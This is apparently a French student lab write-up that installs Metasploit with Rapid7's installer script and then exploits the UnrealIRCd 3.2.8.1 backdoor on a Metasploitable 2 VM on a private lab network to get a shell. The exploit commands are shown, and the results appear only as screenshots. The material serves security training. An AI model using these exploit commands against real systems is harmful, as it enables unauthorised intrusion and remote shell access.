# Metasploit

## Installation Metasploit
```
sudo apt update
sudo apt install -y curl

curl -fsSL https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall
chmod 755 msfinstall
sudo ./msfinstall
```
Et voila c'est installé

![](img/Capture%20d'écran_20261026_132612.png)

## Exploitation de faille.

Nous allons maintenant exploité une des nombreuse faille trouvé sur notre machine Metasploitable 2

![](img/Capture%20d'écran_20261027_103813.png)

Nous allons utilisé cette vulnérabilité

![](img/Capture%20d'écran_20261027_103922.png)

![](img/Capture%20d'écran_20261027_104032.png)

```
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 10.10.10.103
set LHOST 10.10.10.104
run
shell
```

![](img/Capture%20d'écran_20261027_104728.png)

![](img/Capture%20d'écran_20261027_104810.png)

![](img/Capture%20d'écran_20261027_105209.png)

![](img/Capture%20d'écran_20261027_105459.png)

ET VOILA